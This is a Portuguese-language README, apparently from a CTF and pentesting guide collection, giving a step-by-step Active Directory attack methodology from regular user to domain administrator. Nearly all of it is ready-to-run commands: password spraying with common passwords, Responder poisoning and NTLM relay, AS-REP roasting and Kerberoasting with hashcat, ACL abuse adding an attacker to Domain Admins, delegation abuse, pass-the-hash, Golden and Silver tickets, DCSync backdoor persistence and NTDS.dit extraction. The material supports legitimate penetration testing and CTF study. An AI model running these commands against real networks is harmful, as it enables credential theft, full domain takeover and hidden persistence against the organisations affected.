# 🏢 Metodologia de ataque a Active Directory

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Notas de contexto:** este percurso é ilustrativo; cada etapa exige permissões e condições próprias. Uma relação isolada devolvida pela consulta DCSync não comprova todos os direitos de replicação necessários. Os exemplos misturam ferramentas e shells Windows/Linux. CrackMapExec, BloodHound e os coletores também têm diferenças entre gerações; consulte os guias específicos. [BloodHound atual](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) e [continuação comunitária NetExec](https://github.com/Pennyw0rth/NetExec). ACL significa lista de controlo de acesso; SPN identifica um serviço. Pass-the-Hash reutiliza um hash NT e Pass-the-Ticket reutiliza um ticket Kerberos; não são a mesma técnica.

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Guia passo a passo de utilizador a administrador do domínio
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## 🗺️ Visão geral do caminho de ataque

```
┌────────────────────────────────────────────────────────────────────────────────┐
│                           METODOLOGIA DE ATAQUE A AD                           │
├────────────────────────────────────────────────────────────────────────────────┤
│                                                                                │
│ FASE 1: Enumeração        FASE 2: Acesso inicial    FASE 3: Escalada           │
│ ├── Análise da rede       ├── Password spraying     ├── Kerberoasting          │
│ ├── Enumeração LDAP       ├── Falsificação LLMNR    ├── AS-REP roasting        │
│ ├── Utilizadores          └── Relay NTLM            └── Exploração de ACL      │
│ └── BloodHound                                                                 │
│                                                                                │
│ FASE 4: Movimento lateral FASE 5: Persistência      FASE 6: Controlo           │
│ ├── Pass-the-Hash         ├── Golden Ticket         ├── DCSync                 │
│ ├── WinRM/PSExec          ├── Silver Ticket         ├── NTDS.dit               │
│ └── Execução WMI          └── Skeleton Key          └── Controlo total!        │
│                                                                                │
└────────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Índice

1. [Fase 1: enumeração](#-phase-1-enumeration)
2. [Fase 2: acesso inicial](#-phase-2-initial-access)
3. [Fase 3: escalada de privilégios](#-phase-3-privilege-escalation)
4. [Fase 4: movimento lateral](#-phase-4-lateral-movement)
5. [Fase 5: persistência](#-phase-5-persistence)
6. [Fase 6: controlo do domínio](#-phase-6-domain-dominance)
7. [Referência rápida de comandos](#-quick-command-reference)

---

<a id="-phase-1-enumeration"></a>
## 🔍 Fase 1: enumeração

### 1.1 Descoberta da rede

```bash
# Encontrar controladores de domínio
nmap -p 53,88,389,636,445 10.10.10.0/24

# Identificar serviços de AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Portas principais:**
| Porta | Serviço | Finalidade |
|------|---------|---------|
| 53 | DNS | Resolução de nomes do domínio |
| 88 | Kerberos | Autenticação |
| 389 | LDAP | Diretório |
| 445 | SMB | Partilhas de ficheiros |
| 636 | LDAPS | LDAP seguro |
| 5985 | WinRM | Gestão remota |

### 1.2 Enumeração anónima (sem credenciais)

```bash
# Sessão RPC nula
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Ligação LDAP anónima (bind)
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Enumeração de utilizadores com Kerbrute (sem credenciais!)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Com credenciais válidas

```bash
# Obter informações do domínio
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Enumeração LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Enumeração com PowerView

```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Informações do domínio
Get-Domain
Get-DomainController

# Encontrar alvos relevantes
Get-DomainUser -SPN                    # Suscetível a Kerberoasting
Get-DomainUser -PreauthNotRequired      # Suscetível a AS-REP roasting
Get-DomainComputer -Unconstrained       # Delegação

# Encontrar sessões de administradores do domínio
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Recolha para BloodHound

```bash
# A partir de Linux (bloodhound-python)
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# A partir de Windows (SharpHound)
.\SharpHound.exe -c All
```

**Consultas BloodHound:**
```cypher
# Caminho mais curto até administrador do domínio
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Utilizadores suscetíveis a Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Utilizadores com permissões DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

<a id="-phase-2-initial-access"></a>
## 🔑 Fase 2: acesso inicial

### 2.1 Password spraying (uma palavra-passe testada em várias contas)

```bash
# Password spraying com CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Password spraying com Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Palavras-passe comuns:**
```
Season+Year: Summer2024!, Winter2024
CompanyName+123: Company123!
Welcome1, Password1
```

### 2.2 Falsificação de respostas LLMNR/NBT-NS

```bash
# Terminal 1: iniciar Responder
sudo responder -I eth0 -wPv

# Aguardar pela captura de hashes...
# Material NTLMv2 capturado!

# Terminal 2: descobrir a palavra-passe a partir do hash
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 Reencaminhamento de autenticação NTLM (relay)

```bash
# Encontrar alvos sem assinatura SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder (SMB desativado)
sudo responder -I eth0

# Ataque de reencaminhamento de autenticação
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP roasting (sem necessidade de palavra-passe!)

```bash
# Encontrar utilizadores vulneráveis
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Ou com credenciais
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Descobrir o segredo
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="-phase-3-privilege-escalation"></a>
## ⬆️ Fase 3: escalada de privilégios

### 3.1 Kerberoasting

```bash
# A partir de Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# A partir de Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Descobrir o segredo
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Exploração de permissões ACL

**GenericAll num utilizador:**
```powershell
# Alterar a palavra-passe
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll num grupo:**
```powershell
# Adicionar a sua conta ao grupo
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Definir um SPN para Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Atribuir permissões DCSync à sua conta
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Ataques à delegação

**Delegação sem restrições:**
```powershell
# Encontrar alvos
Get-DomainComputer -Unconstrained

# Monitorizar a presença de TGTs
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Provocar a interação (PrinterBug)
SpoolSample.exe DC01 YOURHOST
```

**Delegação restrita:**
```bash
# Pedir um ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Utilizar o ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Delegação restrita baseada em recursos (RBCD):**
```bash
# Criar uma conta de computador
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Configurar RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Obter um ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="-phase-4-lateral-movement"></a>
## ➡️ Fase 4: movimento lateral

### 4.1 Pass-the-Hash

```bash
# PSExec com hash
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket

```bash
# Exportar um ticket
.\Rubeus.exe dump

# Utilizar o ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Utilizar o ticket (Windows)
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM com palavra-passe
evil-winrm -i 10.10.10.10 -u admin -p password

# Com hash
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash

```bash
# Obter um TGT com hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Utilizar agora Kerberos
dir \\server\share
```

---

<a id="-phase-5-persistence"></a>
## 🔒 Fase 5: persistência

### 5.1 Golden Ticket

```bash
# Necessário: hash NTLM de krbtgt e SID do domínio

# Criar o ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Utilizar
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket

```bash
# Criar um ticket de serviço
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 Acesso persistente através de DCSync

```powershell
# Atribuir permissões DCSync a qualquer utilizador
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

<a id="-phase-6-domain-dominance"></a>
## 👑 Fase 6: controlo do domínio

### 6.1 DCSync

```bash
# Extrair todos os hashes
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Com hash
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Utilizador específico
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Extração de NTDS.dit

```bash
# Criar uma cópia sombra
vssadmin create shadow /for=C:

# Copiar NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Extrair sem ligação ao sistema alvo
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Extração com CrackMapExec

```bash
# Extrair NTDS através de DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

<a id="-quick-command-reference"></a>
## 📊 Referência rápida de comandos

### Comandos de enumeração de uma linha

```bash
# Encontrar controladores de domínio
nmap -p 88,389 --open 10.10.10.0/24

# Enumerar utilizadores (sem credenciais)
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Encontrar contas suscetíveis a AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Referência de ataques

| Ataque | Comando |
|--------|---------|
| Password spraying | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Descoberta de palavras-passe a partir de hashes

| Tipo de hash | Modo do Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

## 🎯 Conselhos para CTF

1. **Comece sempre pela enumeração** — Não ataque sem conhecer o contexto
2. **Verifique AS-REP** — Pode obter material de autenticação sem credenciais!
3. **Execute BloodHound** — Encontre caminhos de ataque
4. **Verifique as ACL** — Estão frequentemente mal configuradas
5. **Procure delegações** — Podem revelar oportunidades imediatas
6. **Teste palavras-passe com cuidado** — Há risco de bloquear contas!
7. **Guarde todas as credenciais** — Serão necessárias mais tarde

---

## 📚 Guias de referência relacionados

- [BloodHound](../../BloodHound/translations/README.pt.md)
- [Impacket](../../Impacket/translations/README.pt.md)
- [CrackMapExec](../../CrackMapExec/translations/README.pt.md)
- [Rubeus](../../Rubeus/translations/README.pt.md)
- [PowerView](../../PowerView/translations/README.pt.md)
- [Responder](../../Responder/translations/README.pt.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)

---

<p align="center">
  <b>🏢 De utilizador a administrador do domínio!</b><br>
  <i>Siga a metodologia e obtenha o controlo do domínio</i>
</p>
